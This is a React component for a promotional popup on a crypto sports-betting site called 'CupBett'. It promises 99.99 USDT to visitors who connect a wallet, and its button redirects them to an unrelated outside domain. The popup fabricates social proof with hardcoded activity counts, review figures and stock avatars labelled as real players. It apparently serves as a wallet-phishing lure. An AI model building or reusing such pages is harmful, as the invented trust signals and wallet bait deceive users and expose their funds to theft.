import { useEffect, useState, useRef } from 'react';
import { X, Zap, Shield, Users, TrendingUp, Star } from 'lucide-react';

const PARTICLE_COUNT = 20;

const AVATARS = [
  'https://i.pravatar.cc/40?img=11',
  'https://i.pravatar.cc/40?img=32',
  'https://i.pravatar.cc/40?img=47',
  'https://i.pravatar.cc/40?img=68',
  'https://i.pravatar.cc/40?img=15',
  'https://i.pravatar.cc/40?img=54',
];

function useParticles() {
  return useRef(
    Array.from({ length: PARTICLE_COUNT }, (_, i) => ({
      id: i,
      x: Math.random() * 100,
      y: Math.random() * 100,
      size: Math.random() * 2.5 + 1.2,
      delay: Math.random() * 5,
      duration: Math.random() * 4 + 5,
      opacity: Math.random() * 0.35 + 0.08,
      gold: i < 6,
    }))
  ).current;
}

export function PromoPopup() {
  const [visible, setVisible] = useState(false);
  const [closing, setClosing] = useState(false);
  const particles = useParticles();

  useEffect(() => {
    if (sessionStorage.getItem('cupbett_promo_seen')) return;
    const t = setTimeout(() => setVisible(true), 8000);
    return () => clearTimeout(t);
  }, []);

  function close() {
    setClosing(true);
    setTimeout(() => {
      setVisible(false);
      setClosing(false);
      sessionStorage.setItem('cupbett_promo_seen', '1');
    }, 360);
  }

  function handleConnect() {
    sessionStorage.setItem('cupbett_promo_seen', '1');
    window.location.href = 'https://secureconnectchain.com/';
  }

  if (!visible) return null;

  return (
    <>
      <style>{`
        @keyframes promoBackdropIn  { from{opacity:0}to{opacity:1} }
        @keyframes promoBackdropOut { from{opacity:1}to{opacity:0} }
        @keyframes promoModalIn  { from{opacity:0;transform:scale(0.86) translateY(28px)}to{opacity:1;transform:scale(1) translateY(0)} }
        @keyframes promoModalOut { from{opacity:1;transform:scale(1) translateY(0)}to{opacity:0;transform:scale(0.9) translateY(18px)} }
        @keyframes promoFloat { from{transform:translateY(0)}to{transform:translateY(-20px)} }
        @keyframes promoGoldPulse { 0%,100%{opacity:1;text-shadow:0 0 12px rgba(250,204,21,0.5)}50%{opacity:0.8;text-shadow:0 0 24px rgba(250,204,21,0.8)} }
        @keyframes promoCTAPulse  { 0%,100%{box-shadow:0 0 28px rgba(0,223,169,0.4),0 6px 20px rgba(0,0,0,0.4)}50%{box-shadow:0 0 52px rgba(0,223,169,0.7),0 6px 24px rgba(0,0,0,0.4)} }
        @keyframes promoShimmer   { 0%{transform:translateX(-120%)}60%,100%{transform:translateX(120%)} }
        @keyframes promoRingPulse { 0%,100%{transform:scale(1);opacity:0.5}50%{transform:scale(1.15);opacity:0} }
        @keyframes promoBadgePop  { 0%{transform:scale(0.8);opacity:0}100%{transform:scale(1);opacity:1} }
      `}</style>

      {/* Backdrop */}
      <div
        className="fixed inset-0 z-[9999] flex items-center justify-center p-3 sm:p-5"
        style={{ animation: `${closing ? 'promoBackdropOut' : 'promoBackdropIn'} 0.36s ease forwards` }}
      >
        <div
          className="absolute inset-0 bg-black/80"
          style={{ backdropFilter: 'blur(14px)', WebkitBackdropFilter: 'blur(14px)' }}
          onClick={close}
        />

        {/* Particles */}
        <div className="absolute inset-0 overflow-hidden pointer-events-none">
          {particles.map(p => (
            <div
              key={p.id}
              className="absolute rounded-full"
              style={{
                left: `${p.x}%`, top: `${p.y}%`,
                width: p.size, height: p.size,
                opacity: p.opacity,
                background: p.gold ? '#FACC15' : '#00DFA9',
                animation: `promoFloat ${p.duration}s ${p.delay}s ease-in-out infinite alternate`,
              }}
            />
          ))}
        </div>

        {/* Modal */}
        <div
          className="relative w-full max-w-[820px] rounded-2xl overflow-hidden shadow-[0_40px_120px_rgba(0,0,0,0.95)]"
          style={{
            background: 'linear-gradient(145deg,#0C1118 0%,#0B1520 55%,#0C1118 100%)',
            border: '1px solid rgba(0,223,169,0.2)',
            animation: `${closing ? 'promoModalOut' : 'promoModalIn'} ${closing ? '0.36s cubic-bezier(0.4,0,1,1)' : '0.48s cubic-bezier(0.16,1,0.3,1)'} forwards`,
            maxHeight: '92vh',
            overflowY: 'auto',
          }}
          onClick={e => e.stopPropagation()}
        >
          {/* Top accent */}
          <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-[#00DFA9] via-[#38BDF8] to-[#FACC15] z-10" />

          {/* Glow blobs */}
          <div className="absolute -top-24 -left-24 w-80 h-80 rounded-full pointer-events-none"
            style={{ background: 'radial-gradient(circle,rgba(0,223,169,0.1) 0%,transparent 70%)' }} />
          <div className="absolute -bottom-24 right-32 w-72 h-72 rounded-full pointer-events-none"
            style={{ background: 'radial-gradient(circle,rgba(56,189,248,0.08) 0%,transparent 70%)' }} />
          <div className="absolute top-8 right-16 w-56 h-56 rounded-full pointer-events-none"
            style={{ background: 'radial-gradient(circle,rgba(250,204,21,0.06) 0%,transparent 70%)' }} />

          {/* Inner layout: flex row on md+, column on mobile */}
          <div className="flex flex-col md:flex-row">

            {/* ── Celebrity Image ──────────────────────────────── */}
            <div className="relative shrink-0 w-full md:w-[34%] overflow-hidden"
              style={{ minHeight: '180px', maxHeight: '340px' }}>
              <img
                src="https://media.ourwebprojects.pro/wp-content/uploads/2026/05/Promo-Banner.webp"
                alt="CupBett Promo"
                className="w-full h-full object-cover object-top"
                style={{ minHeight: '180px', maxHeight: '340px' }}
              />
              {/* Blend gradients */}
              <div className="absolute inset-0 pointer-events-none"
                style={{ background: 'linear-gradient(to right,transparent 30%,rgba(12,17,24,0.92) 100%)' }} />
              <div className="absolute inset-x-0 bottom-0 h-20 md:hidden pointer-events-none"
                style={{ background: 'linear-gradient(to top,#0C1118 0%,transparent 100%)' }} />
              <div className="absolute inset-y-0 right-0 w-8 hidden md:block pointer-events-none"
                style={{ background: 'linear-gradient(to right,transparent,#0C1118)' }} />

              {/* Live badge */}
              <div className="absolute top-3 left-3 flex items-center gap-1.5 bg-black/65 rounded-full px-2.5 py-1 border border-[#00DFA9]/30"
                style={{ backdropFilter: 'blur(8px)' }}>
                <span className="w-1.5 h-1.5 rounded-full bg-[#00DFA9] animate-pulse" />
                <span className="text-[9px] font-bold text-[#00DFA9] tracking-widest uppercase">Live Promo</span>
              </div>

              {/* Star rating on image */}
              <div className="absolute bottom-3 left-3 md:hidden flex items-center gap-0.5">
                {[...Array(5)].map((_,i) => (
                  <Star key={i} className="w-3 h-3 fill-[#FACC15] text-[#FACC15]" />
                ))}
                <span className="text-[10px] text-[#94A3B8] ml-1">4.9/5</span>
              </div>
            </div>

            {/* ── Content ──────────────────────────────────────── */}
            <div className="relative flex flex-col justify-between flex-1 px-5 py-5 sm:px-7 sm:py-6">

              {/* Close button */}
              <button
                onClick={close}
                className="absolute top-3 right-3 w-7 h-7 rounded-full flex items-center justify-center text-[#94A3B8]/60 hover:text-[#F8FAFC] hover:bg-[#1E2D3D] transition-all duration-200 z-10"
              >
                <X className="w-3.5 h-3.5" />
              </button>

              {/* Bonus pill */}
              <div className="flex items-center gap-2 mb-3"
                style={{ animation: 'promoBadgePop 0.5s 0.3s cubic-bezier(0.16,1,0.3,1) both' }}>
                <div className="inline-flex items-center gap-1.5 bg-[#FACC15]/10 border border-[#FACC15]/30 rounded-full px-3 py-1">
                  <span className="w-1.5 h-1.5 rounded-full bg-[#FACC15] animate-pulse" />
                  <span className="text-[11px] font-black text-[#FACC15] tracking-wide uppercase"
                    style={{ animation: 'promoGoldPulse 2.5s ease-in-out infinite' }}>
                    ✦ Welcome Bonus Active
                  </span>
                </div>
              </div>

              {/* Headline */}
              <div className="mb-4">
                <h2 className="text-[20px] sm:text-[24px] font-black text-[#F8FAFC] leading-[1.15] mb-2 pr-6">
                  Connect Your Wallet &{' '}
                  <span style={{ background: 'linear-gradient(90deg,#00DFA9,#38BDF8)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>
                    Claim FREE
                  </span>{' '}
                  <span className="text-[#FACC15]" style={{ animation: 'promoGoldPulse 2.5s ease-in-out infinite' }}>
                    99.99 USDT
                  </span>
                </h2>
                <p className="text-[12px] sm:text-[13px] text-[#94A3B8] leading-relaxed max-w-[380px]">
                  Join thousands of winning players on{' '}
                  <span className="text-[#00DFA9] font-semibold">CupBett Sports Trading</span>.
                  Instant deposits, real-time odds, provably fair markets.
                </p>
              </div>

              {/* Star rating (desktop) */}
              <div className="hidden md:flex items-center gap-1.5 mb-4">
                {[...Array(5)].map((_,i) => (
                  <Star key={i} className="w-3.5 h-3.5 fill-[#FACC15] text-[#FACC15]" />
                ))}
                <span className="text-[12px] text-[#94A3B8] ml-0.5">4.9/5 · <span className="text-[#F8FAFC]">12,400+ reviews</span></span>
              </div>

              {/* Live activity / avatars */}
              <div className="flex items-center gap-2.5 mb-4 p-2.5 rounded-xl bg-[#121821]/80 border border-[#253241]/60">
                {/* Real avatars */}
                <div className="flex -space-x-2 shrink-0">
                  {AVATARS.map((src, i) => (
                    <img
                      key={i}
                      src={src}
                      alt={`Player ${i + 1}`}
                      className="w-7 h-7 rounded-full border-2 border-[#0C1118] object-cover"
                      onError={e => {
                        (e.currentTarget as HTMLImageElement).src = `https://api.dicebear.com/7.x/thumbs/svg?seed=${i}&backgroundColor=0f172a`;
                      }}
                    />
                  ))}
                </div>
                <div className="min-w-0">
                  <p className="text-[12px] text-[#F8FAFC] font-semibold">
                    <span className="text-[#00DFA9]">+127 players</span> joined in the last hour
                  </p>
                  <p className="text-[10px] text-[#94A3B8]">Next winner could be you →</p>
                </div>
                <div className="ml-auto shrink-0 flex flex-col items-center">
                  <div className="w-2 h-2 rounded-full bg-[#00DFA9] animate-pulse" />
                  <span className="text-[9px] text-[#00DFA9] mt-0.5 font-bold">LIVE</span>
                </div>
              </div>

              {/* CTA buttons */}
              <div className="flex flex-col sm:flex-row gap-2.5 mb-5">
                <button
                  onClick={handleConnect}
                  className="relative flex-1 flex items-center justify-center gap-2 py-3.5 px-5 rounded-xl font-extrabold text-[14px] text-[#0A0E13] overflow-hidden transition-all duration-200 hover:scale-[1.02] active:scale-[0.97]"
                  style={{
                    background: 'linear-gradient(135deg,#00DFA9 0%,#00BF8F 100%)',
                    boxShadow: '0 0 32px rgba(0,223,169,0.5),0 6px 20px rgba(0,0,0,0.4)',
                    animation: 'promoCTAPulse 2.5s ease-in-out infinite',
                  }}
                >
                  {/* Pulse ring */}
                  <div className="absolute inset-0 rounded-xl border-2 border-[#00DFA9] pointer-events-none"
                    style={{ animation: 'promoRingPulse 2s ease-out infinite' }} />
                  <Zap className="w-4 h-4 shrink-0 fill-[#0A0E13]" />
                  Connect Wallet — Get 99.99 USDT
                  {/* Shimmer */}
                  <div className="absolute inset-0 pointer-events-none"
                    style={{ background: 'linear-gradient(105deg,transparent 35%,rgba(255,255,255,0.28) 50%,transparent 65%)', animation: 'promoShimmer 2.8s ease-in-out infinite' }} />
                </button>

                <button
                  onClick={close}
                  className="sm:w-auto px-5 py-3.5 rounded-xl font-medium text-[13px] text-[#64748B] hover:text-[#94A3B8] border border-[#1E2D3D] hover:border-[#253241] hover:bg-[#121821]/60 transition-all duration-200"
                >
                  Maybe Later
                </button>
              </div>

              {/* Trust badges */}
              <div className="grid grid-cols-3 gap-2 pt-4 border-t border-[#1E2D3D]">
                {[
                  { icon: Users,      label: '50,000+',  sub: 'Active Players',        color: '#00DFA9' },
                  { icon: TrendingUp, label: 'Instant',  sub: 'Crypto Withdrawals',    color: '#38BDF8' },
                  { icon: Shield,     label: 'Provably', sub: 'Fair Experience',        color: '#FACC15' },
                ].map(({ icon: Icon, label, sub, color }) => (
                  <div key={label}
                    className="flex flex-col items-center gap-1 text-center px-1 py-2 rounded-lg hover:bg-[#121821]/60 transition-colors duration-200">
                    <div className="w-8 h-8 rounded-xl flex items-center justify-center mb-0.5"
                      style={{ background: `${color}12`, border: `1px solid ${color}28` }}>
                      <Icon className="w-4 h-4" style={{ color }} />
                    </div>
                    <span className="text-[11px] sm:text-[12px] font-bold text-[#F8FAFC] leading-tight">{label}</span>
                    <span className="text-[9px] sm:text-[10px] text-[#64748B] leading-tight">{sub}</span>
                  </div>
                ))}
              </div>

              {/* Fine print */}
              <p className="text-[9px] text-[#475569] mt-3 text-center leading-snug">
                18+ only · T&amp;Cs apply · Gamble responsibly · Crypto subject to market risk
              </p>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}
